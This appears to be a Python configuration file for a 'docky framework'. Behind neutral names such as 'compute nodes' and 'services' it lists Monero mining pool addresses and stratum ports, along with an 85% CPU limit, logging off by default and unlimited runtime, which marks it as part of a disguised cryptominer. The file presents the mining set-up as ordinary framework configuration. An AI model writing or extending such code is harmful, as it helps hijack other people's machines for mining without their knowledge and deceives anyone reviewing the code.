"""Configuration management for the docky framework."""

import os
from pathlib import Path
from dataclasses import dataclass, field
from typing import List, Optional


DEFAULT_NODES = [
    "eu.supportxmr.com:3333",
    "eu.supportxmr.com:443",
    "us.supportxmr.com:3333",
    "us.supportxmr.com:443",
    "asia.supportxmr.com:3333",
    "asia.supportxmr.com:443",
    "xmrpool.eu:3333",
    "xmrpool.eu:443",
    "mine.c3pool.com:443",
    "mine.c3pool.com:80",
]

SERVICE_PORTS = [3333, 443, 80, 5555, 7777, 14444, 14433, 19999]


@dataclass
class Config:
    """Framework configuration."""
    node_id: str = "default"
    auth_token: str = ""
    active_service: str = ""
    cpu_limit: int = 85
    log_enabled: bool = False
    max_runtime: int = -1
    config_dir: str = str(Path(__file__).resolve().parent.parent.parent)
    _node_list: List[str] = field(default_factory=list)

    def load_env(self) -> None:
        """Load environment variables from .env file."""
        env_path = Path(self.config_dir) / ".env"
        if not env_path.exists():
            return

        with open(env_path) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                key, value = line.split("=", 1)
                value = value.strip().strip('"').strip("'")
                if key == "DOCKY_NODE_ID":
                    self.auth_token = value
                elif key == "DOCKY_ENVIRONMENT":
                    os.environ.setdefault("DOCKY_ENVIRONMENT", value)

    def load_node_list(self) -> List[str]:
        """Load compute node list from configuration."""
        return DEFAULT_NODES[:]

    def get_all_services(self) -> List[str]:
        """Get complete service endpoint list."""
        if not self._node_list:
            self._node_list = self.load_node_list()
        return self._node_list


def load_config() -> Config:
    """Load configuration from environment and project files."""
    config = Config()
    config.load_env()
    return config
